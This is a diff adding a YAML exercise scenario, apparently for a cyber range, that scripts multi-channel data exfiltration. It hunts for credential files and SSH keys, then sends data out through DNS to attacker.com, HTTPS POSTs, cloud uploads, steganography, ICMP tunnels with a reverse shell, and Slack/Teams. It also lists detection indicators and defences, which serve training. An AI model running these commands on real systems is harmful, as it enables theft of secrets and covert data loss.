@@ -1,0 +1,298 @@
+# Data Exfiltration Scenario
+# MITRE ATT&CK: T1041 (Exfiltration Over C2 Channel)
+
+scenario:
+  id: "attack-004"
+  name: "Multi-Channel Data Exfiltration"
+  description: "Exfiltrate sensitive data using multiple covert channels"
+  difficulty: "advanced"
+  duration_minutes: 35
+
+mitre_attack:
+  tactics:
+    - "TA0010"  # Exfiltration
+    - "TA0011"  # Command and Control
+    - "TA0005"  # Defense Evasion
+
+  techniques:
+    - id: "T1041"
+      name: "Exfiltration Over C2 Channel"
+      tactic: "Exfiltration"
+
+    - id: "T1048.003"
+      name: "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
+      tactic: "Exfiltration"
+
+    - id: "T1030"
+      name: "Data Transfer Size Limits"
+      tactic: "Exfiltration"
+
+    - id: "T1567.002"
+      name: "Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+      tactic: "Exfiltration"
+
+attack_chain:
+  - step: 1
+    name: "Data Discovery and Staging"
+    technique: "T1074.001"
+    description: "Locate and stage sensitive data for exfiltration"
+    commands:
+      - tool: "find"
+        args: "/ -name '*password*' -o -name '*secret*' -o -name '*.key' 2>/dev/null"
+        expected_output: "Sensitive files located"
+
+      - tool: "grep"
+        args: "-r 'API_KEY\\|SECRET\\|PASSWORD' /var/www /home /opt 2>/dev/null"
+        expected_output: "Credentials discovered"
+
+      - tool: "tar"
+        args: "czf /tmp/.hidden_data.tar.gz {{SENSITIVE_FILES}}"
+        expected_output: "Data archived"
+
+    success_criteria:
+      - "Located sensitive files"
+      - "Extracted credentials"
+      - "Compressed data archive"
+
+  - step: 2
+    name: "DNS Tunneling Exfiltration"
+    technique: "T1048.003"
+    description: "Exfiltrate data via DNS queries"
+    commands:
+      - tool: "iodine"
+        args: "-f {{ATTACKER_DNS_SERVER}}"
+        expected_output: "DNS tunnel established"
+
+      - tool: "base64-split"
+        args: "cat /tmp/.hidden_data.tar.gz | base64 | split -b 50"
+        expected_output: "Data chunked for DNS"
+
+      - tool: "dns-exfil"
+        args: |
+          for chunk in $(cat data.b64); do
+            dig @{{ATTACKER_DNS}} ${chunk}.exfil.attacker.com
+          done
+        expected_output: "Data transmitted via DNS"
+
+    success_criteria:
+      - "DNS tunnel operational"
+      - "Data encoded and chunked"
+      - "Successfully exfiltrated via DNS"
+
+  - step: 3
+    name: "HTTPS Exfiltration"
+    technique: "T1041"
+    description: "Exfiltrate data over encrypted HTTPS channel"
+    commands:
+      - tool: "curl"
+        args: "-X POST -F 'file=@/tmp/.hidden_data.tar.gz' https://{{ATTACKER_SERVER}}/upload"
+        expected_output: "Data uploaded via HTTPS"
+
+      - tool: "python3"
+        args: |
+          import requests
+          with open('/tmp/.hidden_data.tar.gz', 'rb') as f:
+              requests.post('https://{{ATTACKER_SERVER}}/api/upload', files={'data': f})
+        expected_output: "File transmitted"
+
+    success_criteria:
+      - "HTTPS connection established"
+      - "Data encrypted in transit"
+      - "Upload completed successfully"
+
+  - step: 4
+    name: "Cloud Storage Exfiltration"
+    technique: "T1567.002"
+    description: "Upload data to cloud storage service"
+    commands:
+      - tool: "aws-cli"
+        args: "s3 cp /tmp/.hidden_data.tar.gz s3://{{ATTACKER_BUCKET}}/{{RANDOM_NAME}}"
+        expected_output: "Uploaded to AWS S3"
+
+      - tool: "gdrive"
+        args: "upload /tmp/.hidden_data.tar.gz"
+        expected_output: "Uploaded to Google Drive"
+
+      - tool: "rclone"
+        args: "copy /tmp/.hidden_data.tar.gz dropbox:exfil/"
+        expected_output: "Synced to Dropbox"
+
+    success_criteria:
+      - "Cloud credentials obtained"
+      - "Data uploaded to cloud"
+      - "Legitimate cloud traffic used"
+
+  - step: 5
+    name: "Steganography Exfiltration"
+    technique: "T1027.003"
+    description: "Hide data in image files"
+    commands:
+      - tool: "steghide"
+        args: "embed -cf innocent.jpg -ef /tmp/.hidden_data.tar.gz"
+        expected_output: "Data embedded in image"
+
+      - tool: "upload"
+        args: "curl -X POST -F 'image=@innocent.jpg' https://{{SOCIAL_MEDIA}}/upload"
+        expected_output: "Image posted publicly"
+
+    success_criteria:
+      - "Data hidden in image"
+      - "Posted to public platform"
+      - "Appears as normal activity"
+
+  - step: 6
+    name: "ICMP Tunneling"
+    technique: "T1048.003"
+    description: "Exfiltrate via ICMP echo requests"
+    commands:
+      - tool: "ptunnel"
+        args: "-p {{ATTACKER_IP}} -lp 8000 -da {{INTERNAL_IP}} -dp 22"
+        expected_output: "ICMP tunnel established"
+
+      - tool: "icmpsh"
+        args: ""
+        expected_output: "Reverse ICMP shell"
+
+      - tool: "data-send"
+        args: "cat /tmp/.hidden_data.tar.gz | xxd -p | while read line; do ping -c 1 -p $line {{ATTACKER_IP}}; done"
+        expected_output: "Data transmitted in ICMP payloads"
+
+    success_criteria:
+      - "ICMP tunnel operational"
+      - "Data embedded in ping packets"
+      - "Successfully reconstructed on attacker side"
+
+  - step: 7
+    name: "Slack/Teams Exfiltration"
+    technique: "T1567"
+    description: "Use collaboration tools for data exfiltration"
+    commands:
+      - tool: "slack-upload"
+        args: |
+          curl -F file=@/tmp/.hidden_data.tar.gz \
+               -F 'token={{SLACK_TOKEN}}' \
+               -F 'channels={{CHANNEL_ID}}' \
+               https://slack.com/api/files.upload
+        expected_output: "File uploaded to Slack"
+
+      - tool: "teams-webhook"
+        args: |
+          curl -H 'Content-Type: application/json' \
+               -d '{"text": "{{BASE64_DATA}}"}' \
+               {{TEAMS_WEBHOOK_URL}}
+        expected_output: "Data posted to Teams"
+
+    success_criteria:
+      - "Obtained collaboration tool access"
+      - "Data uploaded as file"
+      - "Appears as legitimate business communication"
+
+defense_detection:
+  indicators:
+    - type: "network"
+      description: "Abnormal DNS query patterns"
+      pattern: "High volume of DNS TXT/NULL queries"
+      severity: "HIGH"
+
+    - type: "network"
+      description: "Large HTTPS uploads to external IPs"
+      pattern: "{{INTERNAL_IP}} -> {{EXTERNAL_IP}}:443 (>100MB)"
+      severity: "MEDIUM"
+
+    - type: "cloud"
+      description: "Unusual cloud storage API calls"
+      pattern: "S3/Drive API from unexpected source"
+      severity: "HIGH"
+
+    - type: "network"
+      description: "ICMP tunneling indicators"
+      pattern: "Large ICMP packets with data payloads"
+      severity: "HIGH"
+
+    - type: "application"
+      description: "Collaboration tool abuse"
+      pattern: "Large file uploads to Slack/Teams"
+      severity: "MEDIUM"
+
+defensive_measures:
+  preventive:
+    - "DNS query monitoring and filtering"
+    - "TLS/SSL inspection for HTTPS traffic"
+    - "Cloud access broker (CASB) deployment"
+    - "Data Loss Prevention (DLP) rules"
+    - "Restrict ICMP packet sizes"
+    - "Monitor collaboration tool usage"
+
+  detective:
+    - "DNS tunnel detection signatures"
+    - "Anomalous upload volume alerts"
+    - "Cloud activity baseline monitoring"
+    - "Steganography detection tools"
+    - "ICMP payload analysis"
+    - "Collaboration tool file audit logs"
+
+  responsive:
+    - "Block exfiltration channels"
+    - "Isolate affected systems"
+    - "Revoke cloud credentials"
+    - "Quarantine uploaded files"
+    - "Initiate data breach response"
+    - "Notify affected parties"
+
+learning_objectives:
+  - "Understand covert exfiltration channels"
+  - "Learn DNS tunneling techniques"
+  - "Master steganography methods"
+  - "Practice cloud service abuse"
+  - "Learn protocol-based exfiltration"
+
+difficulty_modifiers:
+  easy:
+    - "No egress filtering"
+    - "Minimal monitoring"
+    - "Unrestricted cloud access"
+
+  hard:
+    - "Strict egress filtering"
+    - "DLP enabled"
+    - "Cloud access controls"
+    - "TLS inspection active"
+    - "DNS monitoring deployed"
+
+scoring:
+  max_points: 1400
+  breakdown:
+    data_staging: 150
+    dns_tunneling: 300
+    https_exfiltration: 250
+    cloud_exfiltration: 250
+    steganography: 200
+    icmp_tunneling: 250
+
+  stealth_bonus:
+    undetected_complete: 600
+    single_channel_detected: 300
+    multiple_channels_detected: 100
+
+environment:
+  required_tools:
+    - iodine
+    - steghide
+    - ptunnel
+    - aws-cli
+    - curl
+    - python3
+
+  target_data:
+    - "/home/user/Documents/passwords.txt"
+    - "/var/www/html/.env"
+    - "/root/.ssh/id_rsa"
+    - "/opt/app/config/database.yml"
+
+  network:
+    target_ip: "10.0.60.10"
+    attacker_ip: "203.0.113.50"
+    attacker_dns: "8.8.4.4"  # Compromised resolver
+    cloud_storage:
+      - "s3://exfil-bucket-random"
+      - "gdrive://personal-drive"
